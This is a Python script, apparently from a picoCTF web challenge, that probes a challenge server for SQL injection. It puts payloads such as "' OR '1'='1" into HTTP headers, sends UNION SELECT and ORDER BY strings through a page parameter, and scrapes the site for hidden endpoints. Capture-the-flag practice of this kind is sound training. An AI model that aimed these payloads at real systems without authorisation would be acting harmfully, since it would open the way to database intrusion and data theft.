#!/usr/bin/env python3
"""Systematic SQL injection testing for ORDER ORDER CTF challenge"""
import requests
import re

s = requests.Session()
s.post('http://crystal-peak.picoctf.net:54012/login', data={'username':'ctf178542632036c1','password':'test123'})

# Try header injection
headers = {
    'User-Agent': "admin' OR '1'='1",
}
r = s.get('http://crystal-peak.picoctf.net:54012/expenses', headers=headers)
print("UA injection:", r.status_code, "error:", 'error' in r.text.lower() or 'syntax' in r.text.lower())

# Try Accept header
r = s.get('http://crystal-peak.picoctf.net:54012/expenses', headers={'Accept': "text/html' OR '1'='1"})
print("Accept injection:", r.status_code)

# Try Content-Type
r = s.get('http://crystal-peak.picoctf.net:54012/expenses', headers={'Content-Type': "text/html'--"})
print("Content-Type injection:", r.status_code)

# Try Origin/Referer
r = s.get('http://crystal-peak.picoctf.net:54012/expenses', headers={'Referer': "http://test.com/?sort=id'"})
print("Referer injection:", r.status_code)

# Search for hidden endpoints
r = s.get('http://crystal-peak.picoctf.net:54012/')
links = re.findall(r'href=[\"\']([^\"\']+)[\"\']', r.text)
print("\nLinks on home page:", links)
r2 = s.get('http://crystal-peak.picoctf.net:54012/expenses')
links2 = re.findall(r'href=[\"\']([^\"\']+)[\"\']', r2.text)
print("Links on expenses page:", links2)
r3 = s.get('http://crystal-peak.picoctf.net:54012/inbox')
links3 = re.findall(r'href=[\"\']([^\"\']+)[\"\']', r3.text)
print("Links on inbox page:", links3)

# Find all forms
all_text = r.text + r2.text + r3.text
forms = re.findall(r'action=[\"\']([^\"\']+)[\"\']', all_text)
print("Forms:", forms)

# Test for DBMS fingerprinting with error messages
print("\n=== DBMS fingerprinting ===")
for payload in [
    "page=1'", "page=1\"", "page=1\\",
    "page=1 AND 1=1", "page=1 AND 1=2",
    "page=1 UNION SELECT NULL--",
    "page=1 UNION SELECT NULL,NULL,NULL--",
    "page=1 ORDER BY 100--",
]:
    r = s.get(f'http://crystal-peak.picoctf.net:54012/expenses?{payload}')
    has_err = ('error' in r.text.lower() or 'syntax' in r.text.lower() or 
               'traceback' in r.text.lower() or 'exception' in r.text.lower())
    if has_err:
        # Extract error text
        print(f"\nERROR with {payload!r}:")
        # Try to find error messages
        import re
        err_match = re.search(r'error.*?<', r.text, re.IGNORECASE | re.DOTALL)
        if err_match:
            print(err_match.group()[:200])
        print("Full response snippet:")
        print(r.text[:500])
        break
else:
    print("No errors found with page parameter")

# Let me also check what happens if I try extreme values
for page_val in ["999999", "-1", "0", "NULL", "0.5", "1e0"]:
    r = s.get(f'http://crystal-peak.picoctf.net:54012/expenses?page={page_val}')
    td_count = r.text.count('<td>')
    print(f"page={page_val}: {td_count} td tags, status={r.status_code}")
